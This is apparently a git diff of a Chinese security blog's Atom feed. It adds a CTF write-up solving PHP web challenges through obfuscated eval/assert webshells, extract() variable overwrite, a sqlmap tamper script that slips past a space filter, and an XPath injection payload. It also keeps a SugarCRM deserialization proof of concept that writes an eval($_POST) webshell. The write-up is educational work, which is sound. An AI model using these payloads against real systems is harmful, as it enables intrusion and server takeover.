@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2018-01-01T14:35:47.801Z</updated>
+  <updated>2018-01-06T15:31:35.920Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,88 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>month 2 for cnas writeup</title>
+    <link href="http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html"/>
+    <id>http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</id>
+    <published>2018-01-06T14:29:49.000Z</published>
+    <updated>2018-01-06T15:31:35.920Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
+<p>整理下代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__file__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt;</div><div class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</div><div class="line">$m=$_POST[m];</div><div class="line">if($m==null)</div><div class="line">	header(&apos;status:404&apos;);</div><div class="line">else/**/</div><div class="line">	$k($m);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p>
+<p>看about的源码这里可以看出m的值为assert</p>
+<p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p>
+<p>传入system()函数来读取文件即可。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_1.png" alt=""></p>
+<h2 id="02-50"><a href="#02-50" class="headerlink" title="02 50"></a>02 50</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="external">http://47.100.121.220:28002/02.php</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">@$YT($TH^$TU); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这个题目也有highlight_file函数也是用来读about的源码</p>
+<p>这里我们可以直接测试输出这三个变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">echo $YT;</div><div class="line">echo $TH^$TU; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码运行得到</p>
+<p>\$YT=assert </p>
+<p>\$TH^\$TUeval($_POST[0x41]);</p>
+<p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p>
+<p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p>
+<p>同样传入system函数执行命令</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_2.png" alt=""></p>
+<h2 id="gift-100"><a href="#gift-100" class="headerlink" title="gift 100"></a>gift 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>右键查看源码可以发现备份文件gift.php.bak</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag=&apos;xxx&apos;;</div><div class="line">extract($_GET);</div><div class="line">if(isset($gift))</div><div class="line">&#123;</div><div class="line">	$content=trim(file_get_contents($flag));</div><div class="line">	if($gift==$content)</div><div class="line">	&#123;</div><div class="line">		echo&apos;flag&#123;...&#125;&apos;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo&apos;Oh..&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码如上，这里考到一个变量覆盖的问题。</p>
+<p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>
+<p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</div></pre></td></tr></table></figure>
+<h2 id="variable-100"><a href="#variable-100" class="headerlink" title="variable 100"></a>variable 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="external">http://47.100.121.220:28004</a></p>
+<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</div><div class="line">echo $s;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line"></div><div class="line">if(isset($_GET[&apos;a&apos;])) &#123;</div><div class="line">    $args = $_GET[&apos;a&apos;];</div><div class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</div><div class="line">        die(&quot;error!&quot;);</div><div class="line">    &#125;</div><div class="line">    eval(&quot;var_dump($$args);&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>看代码可以看出我们需要去读flag.php里的变量flag，</p>
+<p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p>
+<p>但是这里是有正则匹配的，传入flag是行不通的，但是我们可以传入GLOBALS</p>
+<p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p>
+<p>所以payload如下，得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</div></pre></td></tr></table></figure>
+<h2 id="price-100"><a href="#price-100" class="headerlink" title="price 100"></a>price 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005" target="_blank" rel="external">http://47.100.121.220:28005</a></p>
+<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p>
+<p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="external"></a></p>
+<p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p>
+<p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p>
+<p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p>
+<p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p>
+<p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p>
+<p>这里我们可以用%09来绕过</p>
+<p>tamper 代码具体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from lib.core.enums import PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.LOW</div><div class="line"></div><div class="line">def dependencies():</div><div class="line">    pass</div><div class="line"></div><div class="line">def tamper(payload, **kwargs):</div><div class="line">    retVal = payload</div><div class="line"></div><div class="line">    if payload:</div><div class="line">        retVal = &quot;&quot;</div><div class="line">        quote, doublequote, firstspace = False, False, False</div><div class="line"></div><div class="line">        for i in xrange(len(payload)):</div><div class="line">            if not firstspace:</div><div class="line">                if payload[i].isspace():</div><div class="line">                    firstspace = True</div><div class="line">                    retVal += &quot;%09&quot;</div><div class="line">                    continue</div><div class="line"></div><div class="line">            elif payload[i] == &apos;\&apos;&apos;:</div><div class="line">                quote = not quote</div><div class="line"></div><div class="line">            elif payload[i] == &apos;&quot;&apos;:</div><div class="line">                doublequote = not doublequote</div><div class="line"></div><div class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</div><div class="line">                retVal += &quot;%09&quot;</div><div class="line">                continue</div><div class="line"></div><div class="line">            retVal += payload[i]</div><div class="line"></div><div class="line">    return retVal</div></pre></td></tr></table></figure>
+<p>这里我们用这个脚本就能跑sqlmap了</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_3.png" alt=""></p>
+<h2 id="hello-100"><a href="#hello-100" class="headerlink" title="hello    100"></a>hello    100</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="external">http://47.100.121.220:28006</a></p>
+<h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><p>这个题拿到手是没有什么思路的，</p>
+<p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p>
+<p>发现提示存在xpath注入</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_4.png" alt=""></p>
+<p>这里的payload还爆出了三个类似用户名的信息</p>
+<p>这个是HCTF 2015的一个原题，题目的把用户名改了</p>
+<p>但是burpsuit已经帮我爆出了用户名。</p>
+<p>修改下writeup的payload就可以得到flag了</p>
+<p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>week 7 for cnas writeup</title>
@@ -1223,7 +1305,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -1999,462 +2081,6 @@
 <p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests as req</div><div class="line"></div><div class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</div><div class="line"></div><div class="line">data = &#123;  </div><div class="line">    &apos;method&apos;: &apos;login&apos;,</div><div class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</div><div class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">req.post(url, data=data)</div></pre></td></tr></table></figure></p>
 <p>脚本执行后shell位于custom/1.php：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php5.png" alt=""></p>
 <h2 id="Java反序列化漏洞（待续）"><a href="#Java反序列化漏洞（待续）" class="headerlink" title="Java反序列化漏洞（待续）"></a>Java反序列化漏洞（待续）</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="external">PHP反序列化漏洞与CVE-2016-7124</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Web For Pentester I 练习笔记</title>
-    <link href="http://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
-    <id>http://uknowsec.cn/posts/notes/Web-For-Pentester-I-练习笔记.html</id>
-    <published>2017-07-20T07:07:46.000Z</published>
-    <updated>2017-07-24T02:18:54.264Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="external">web_for_pentester_i386.iso</a></p>
-<p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
-<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
-<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int preg_match( string pattern, string subject [, array matches ] )</div></pre></td></tr></table></figure>
-<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pattern</td>
-<td style="text-align:center">正则表达式</td>
-</tr>
-<tr>
-<td>subject</td>
-<td style="text-align:center">需要匹配检索的对象</td>
-</tr>
-<tr>
-<td>matches</td>
-<td style="text-align:center">可选，存储匹配结果的数组， matches[0] 将包含与整个模式匹配的文本 matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</td>
-</tr>
-</tbody>
-</table>
-<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
-<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pattern</td>
-<td style="text-align:center">正则表达式</td>
-</tr>
-<tr>
-<td>replacement</td>
-<td style="text-align:center">替换的内容</td>
-</tr>
-<tr>
-<td>subject</td>
-<td style="text-align:center">需要匹配替换的对象</td>
-</tr>
-<tr>
-<td>limit</td>
-<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
-</tr>
-</tbody>
-</table>
-<h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
-<h3 id="正则表达式中的模式修正符"><a href="#正则表达式中的模式修正符" class="headerlink" title="正则表达式中的模式修正符"></a>正则表达式中的模式修正符</h3><p>模式修正符就是字母，只不过这些在模式修正符的应用之中有特殊的含义。下面我来看看都有哪些模式修正符，请看下表： </p>
-<table>
-<thead>
-<tr>
-<th>模式修正符</th>
-<th style="text-align:center">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>i</td>
-<td style="text-align:center">表示在和模式进行匹配进不区分大小写</td>
-</tr>
-<tr>
-<td>m</td>
-<td style="text-align:center">将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</td>
-</tr>
-<tr>
-<td>s</td>
-<td style="text-align:center">如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行</td>
-</tr>
-<tr>
-<td>x</td>
-<td style="text-align:center">表示模式中的空白忽略不计</td>
-</tr>
-<tr>
-<td>e</td>
-<td style="text-align:center">正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用</td>
-</tr>
-<tr>
-<td>A</td>
-<td style="text-align:center">以模式字符串开头，相当于元字符^</td>
-</tr>
-<tr>
-<td>Z</td>
-<td style="text-align:center">以模式字符串结尾，相当于元字符$</td>
-</tr>
-<tr>
-<td>U</td>
-<td style="text-align:center">正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</td>
-</tr>
-</tbody>
-</table>
-<h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p>prompt() 方法用于显示可提示用户进行输入的对话框</p>
-<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">prompt(text,defaultText)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>text</td>
-<td style="text-align:center">可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）。</td>
-</tr>
-<tr>
-<td>defaultText</td>
-<td style="text-align:center">可选。默认的输入文本。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="confirm"><a href="#confirm" class="headerlink" title="confirm()"></a>confirm()</h3><p>confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。</p>
-<h4 id="语法：-3"><a href="#语法：-3" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">confirm(message)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-3"><a href="#参数说明：-3" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>message</td>
-<td style="text-align:center">要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td>
-</tr>
-</tbody>
-</table>
-<h3 id="fromCharCode"><a href="#fromCharCode" class="headerlink" title="fromCharCode()"></a>fromCharCode()</h3><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
-<h4 id="语法：-4"><a href="#语法：-4" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(numX,numX,...,numX)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-4"><a href="#参数说明：-4" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>numX</td>
-<td style="text-align:center">必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="eval-string"><a href="#eval-string" class="headerlink" title="eval(string)"></a>eval(string)</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
-<h4 id="语法：-5"><a href="#语法：-5" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(string)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-5"><a href="#参数说明：-5" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。要计算的字符串，其中含有要计算的 JavaScript 表达式或要执行的语句。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="Document-write"><a href="#Document-write" class="headerlink" title="Document.write()"></a>Document.write()</h3><p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
-<h4 id="语法：-6"><a href="#语法：-6" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(exp1,exp2,exp3,....)</div></pre></td></tr></table></figure>
-<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
-<p>假设当前的URL是<a href="http://www.uknowsec/test.htm#PART2：" target="_blank" rel="external">http://www.uknowsec/test.htm#PART2：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">document.write(location.hash);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>以上实例输出结果：</p>
-<p>#part2</p>
-<h3 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
-<h4 id="语法：-7"><a href="#语法：-7" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stringObject.substring(start,stop)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-6"><a href="#参数说明：-6" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>start</td>
-<td style="text-align:center">必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。</td>
-</tr>
-<tr>
-<td>stop</td>
-<td style="text-align:center">可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h3><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
-<h4 id="语法：-8"><a href="#语法：-8" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strstr(string,search,before_search)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-7"><a href="#参数说明：-7" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定被搜索的字符串。</td>
-</tr>
-<tr>
-<td>search</td>
-<td style="text-align:center">必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td>
-</tr>
-<tr>
-<td>before_search</td>
-<td style="text-align:center">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
